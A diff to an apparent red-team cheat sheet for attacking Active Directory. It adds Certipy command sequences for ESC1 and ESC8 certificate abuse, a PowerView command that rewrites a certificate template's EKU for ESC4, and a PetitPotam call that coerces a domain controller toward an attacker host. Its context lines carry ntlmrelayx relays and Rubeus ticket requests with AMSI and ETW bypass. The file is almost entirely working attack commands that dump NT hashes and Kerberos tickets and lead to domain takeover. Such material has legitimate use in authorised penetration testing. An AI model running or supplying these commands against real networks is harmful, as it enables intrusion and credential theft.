@@ -449,6 +449,8 @@
       * `ntlmrelayx.py -6 -t ldaps://<dc_ip>`
    * Dump LDAP (any domain user)
       * `ntlmrelayx.py -6 -t ldaps://<domain> -wh attacker-wpad --delegate-access`
+      * Filter all usernames
+        * `cat domain_users.grep | awk -F '\t' '{print $3}' | sort -u > users.txt`
    * Dump SAM (default)
       * `ntlmrelayx.py -6 -t <target>`
 * Choose trigger
@@ -747,6 +749,8 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * ESC4 - Vulnerable Certificate Template Access Control
    * If an attacker has FullControl or WriteDacl permissions over a certificate template’s AD object, this allows them to push a misconfiguration to a template that is not otherwise vulnerable, leading to ESC1 vulnerability. Always check the "Permissions" column if you have run Certify, and pay attention to, for example, "Full Control" or "WriteDacl". If Domain Users or Domain Computers appear in this list, you can change attributes yourself in the template. For example, you can set the EKU to "Client Authentication", you can disable manager approval, etc.
    * Examples can be found here: https://redteam.wiki/postexploitation/active-directory/adcs/esc4
+   * Modify the EKU from ServerAuthentication to ClientAuthentication using PowerView:
+     * `Set-DomainObject -SearchBase "LDAP://dc.domain.tld/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=tld" -Identity WebServer -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose`
 * ESC5 - Vulnerable PKI AD Object Access Control
    * This is a container for AD misconfigurations that happen outside of ADCS. For example, when you can take over the CA server computer object by means of an RBCD. Basically it involves compromising the CA server itself.
    * No examples here.
@@ -782,6 +786,22 @@ $assem = [System.Reflection.Assembly]::Load($data)
       * `inlineExecute-Assembly --dotnetassembly Rubeus.exe --assemblyargs asktgt /user:<da> /certificate:C:\Windows\Tasks\cert.pfx /password:<pfx_password> /ptt --amsi --etw`
    * Verify
       * `ls \\dc1.bamisoup.com\c$`
+* Certipy - ESC1
+  * Check vulnerable for certificate templates
+    * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
+  * Request certificate with alternative name
+    * `certipy req -u <user> -p <pass> -ca <ca-name> -target <servername> -template <template> -upn administrator@test.local`
+  * Authenticate (dumps NT hash and TGT)
+    * `certipy auth -pfx administrator.pfx -dc-ip <ip>`
+* Certipy - ESC8
+  * Check vulnerable for certificate templates
+    * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
+  * Start relay
+    * `certipy relay -ca <ca-server>`
+  * Coerce authentication
+    * `PetitPotam.py -d <domain> -u <user> -p <pass> <ATTACKER> <DC>`
+  * Authenticate (dumps NT hash and TGT)
+    * `certipy auth -pfx <dc>.pfx -dc-ip <ip>`
 
 
 ## Empty passwords
